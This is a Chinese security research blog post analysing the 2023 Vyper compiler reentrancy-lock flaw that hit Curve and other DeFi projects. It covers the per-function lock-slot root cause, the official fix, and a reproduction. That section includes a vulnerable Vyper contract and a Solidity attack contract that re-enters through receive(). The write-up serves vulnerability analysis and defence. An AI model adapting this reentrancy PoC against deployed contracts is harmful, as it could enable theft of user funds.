#  Vyper 智能合约重入锁防御失效漏洞分析   
原创 whatiwhere  山石网科安全技术研究院   2023-08-01 10:02  
  
## 事件背景  
  
2023年7月31日0点左右，vyper官方提醒，0.2.15, 0.2.16和0.3.0的vyper的重入锁有漏洞。目前，由此漏洞造成的损失已超过7000万美元，受影响的项目包括Curve、Alchemix 和 JPEG'd。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqobtfFBOaXelfJeXy98jLvYlq3bZ3EJDXqudhMrI68TMTRFWKoLMclg/640?wx_fmt=png "")  
## 原因分析  
  
生成外部函数的ir的函数：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqsbgDI0dWqvoTySOeIAG85GdRHvsaJJFKnN6mpyiaeSAGchCbicXIVtiag/640?wx_fmt=png "")  
  
调用get_nonreentrant_lock函数获取检查重入锁：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uq4CBe5J8mZncoNlsPicFSWjjUgZHsffich9l5u0yz7F3yIpria30nFIR0Q/640?wx_fmt=png "")  
  
这部分的逻辑是首先查看该函数是否是重入保护函数，如果是的话获取存储重入flag的slot的位置。  
  
check_notset = ["assert", ["ne", temp_value, [LOAD, nkey]]] 这个语句的意思是使用load指令读取重入flag的slot，将值存入临时变量中，并断言这个值是否为真。  
  
set_data_positions 函数的功能是设置一个合约中所有变量在slot中的位置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqGeuWE8mr9oQtPp0grgoO4MFf1MBz375lHoEZ0HshavyrlJtv3Ts5Ow/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqzhz6KH9RogMiakxtZLv2VkJCMDFlUJe9eqcg8JtEU6rZ55HsCoojSlQ/640?wx_fmt=png "")  
  
在第一个for循环中，遍历一个合约中的所有函数，node是一个函数定义结点，如果函数定义中有nonreentrant装饰器，则调用set_reentrancy_key_position设置重入锁flag的slot位置：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqP0CVM79z5ImWhia9VDJffprT5ICr9uyzC8Zzqibz7nTgBxB2g3xA305g/640?wx_fmt=png "")  
  
问题的关键是一个合约中可能有多个函数使用nonreentrant装饰器，这里相当于给每一个函数都分配了一个重入锁flag。  
  
如果重入的自身的函数，那没有问题，因为访问的是同一个重入锁flag，但如果重入调用的是其他函数，这时候访问的是这个被调用函数的slot，这时的flag还是初始状态，所以可以绕过重入锁。  
## 官方修复  
  
在0.3.1版本的set_storage_slots函数中，对整个合约只设置一个重入锁flag的slot：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uq1T8QCUlDAmHvuRwB1ib0xMdlxhyv3kia7DQY0iadyeT2khLOyG3cMQvLA/640?wx_fmt=png "")  
  
有意思的是，官方认为这只是一个优化上的小问题，因为旧版版会占用更多的slot，而没意识到这将导致严重的安全问题：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uq68VFnTgxQ9voNAY3PmIREzrsYnYKM1Y1Ro6Iu3NhKiaVFOaqs9Uqbzg/640?wx_fmt=png "")  
## 漏洞复现  
  
首先安装0.2.15版本的vyper：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqUQPr9q1HfeVTlZDTAPjnuFWtMZSaE0X04CfBOS1M3Z7UKztVYniasZA/640?wx_fmt=png "")  
  
被攻击的vyper合约：  
```
@nonreentrant("lock")
@external
def a(contract: address):
    value: uint256 = 0
    raw_call(contract, b"",value=value)

@nonreentrant("lock")
@external
def b():
    pass

```  
  
两个函数都是用nonreentrant装饰器。  
  
攻击合约：  
```
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

import "./Itest.sol";

contract Exp{
    Itest public test;
    uint256 public times;

    constructor(address _test) {
        test = Itest(_test);
    }

    function go() public {
        test.a(address(this));
    }

    receive () external payable { 
        if (times == 0) {
            times++;
            // test.b();
            test.a(address(0));
        }
    }
}

```  
  
首先测试重入a函数，即重新调用本身的函数，调用失败：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uq9ts77wOXgPk4qpfYHGd4yffQHx9NJAeCAuWRZFv5n2MXeP9nvUyCkw/640?wx_fmt=png "")  
  
接着测试调用b函数，此时调用成功，说明漏洞存在：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqWFINY2ewMUPviaIfk3iaWMEPWdd42BYMTEBznTEhutLG6BElXHib26Hvw/640?wx_fmt=png "")  
  
升级vyper到0.3.1:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqicmOdRZyotiaerc0ncnaCFJribyic0Ptd51IGd7z6cZVQxG3SyLaqO98rQ/640?wx_fmt=png "")  
  
这时就无法在a函数中调用b函数：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSOKGywSXbU4FlJJTUDS5uqh0CTQywiagP9MciaIOla1h3WuO77BAsdBDtXibhD1ibcgaAJgaiaWmE3u7g/640?wx_fmt=png "")  
  
复现链接：  
  
**https://github.com/wangbar0133/vyper_0215**  
  
  
